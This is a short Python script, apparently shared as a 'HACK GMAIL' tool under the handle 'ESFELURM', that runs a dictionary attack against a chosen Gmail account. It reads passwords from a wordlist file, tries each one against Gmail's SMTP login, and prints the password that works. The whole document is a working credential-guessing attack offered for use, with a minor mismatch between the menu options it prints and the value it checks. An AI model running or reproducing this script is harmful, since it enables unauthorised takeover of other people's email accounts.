import smtplib
from os import system
def artwork():
    print ( "         <\> " )
    print ( " " )
    print ( "         CR : ESFELURM ")
    print ( "  " )
    print ( "         HACK GMAIL ")
    print ( " " )
    print ( "         channel telegram & gitbub & rubika : @esfelurm ")
    print ( " ")
artwork()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input(" [ +@gmail.com ] Enter Adres gmail target :  ")

print("\n")

pwd = input(" Enter adres password list [ name password list {2} ] & [ password khodkar {0} ]  :  ")

if pwd=='1':
    passswfile="Passwords.txt"

else :
    print("\n")
    passswfile = input(" [ pass.txt ] name Password : ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print(" password dorost ♡ %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print(" password Error !! %s " % password)
